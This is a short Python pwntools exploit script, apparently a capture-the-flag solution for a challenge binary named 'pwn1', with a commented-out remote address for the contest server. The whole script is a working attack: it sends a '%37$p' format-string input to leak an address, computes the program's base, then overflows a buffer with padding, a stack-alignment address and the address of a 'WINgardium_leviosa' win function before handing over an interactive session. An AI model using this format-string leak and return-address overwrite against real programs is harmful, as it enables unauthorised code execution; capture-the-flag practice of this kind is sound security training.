#!/usr/bin/env python3
from pwn import *

LEAK_BASE_OFFSET = 0x9e9

elf = ELF('./pwn1/pwn1', checksec=False)

target = process('./pwn1/pwn1')
# target = remote('hax1.allesctf.net', 9100)

target.recvline_contains('name:')
target.sendline('%37$p')
leak = target.recvline_contains('spell:').split(b' ')
base = int(leak[0][2:], 16) - LEAK_BASE_OFFSET
win = base + elf.symbols['WINgardium_leviosa']
log.success(f'Leaked base address: {hex(base)}')
log.info(f'Target address: {hex(win)}')

stack_align = win + 0x36
target.sendline(b'Expelliarmus\0' +
	b'x' * cyclic_find(b'cnaa') +
	p64(stack_align) + p64(win))
target.interactive()
